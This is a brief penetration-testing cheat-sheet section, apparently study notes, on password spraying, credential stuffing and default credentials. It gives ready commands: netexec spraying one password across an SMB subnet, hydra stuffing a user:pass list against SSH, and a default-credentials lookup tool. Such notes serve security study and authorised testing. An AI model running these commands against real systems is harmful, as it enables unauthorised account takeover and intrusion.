## Spraying / Stuffing and Defaults

- **Password spraying** means testing **one password against many users**.

Example:

```
netexec smb ip/24 -u <userlist> -p 'Change123'
```

- **Credential stuffing** means reusing leaked credentials on another service.

Perform:

```
hydra -C user_pass.list ssh://ip
```

`(user:pass)`

- **Default Credentials**

```
pip3 install defaultcreds-cheat-sheet
```

After install:

```
creds search linksys
```
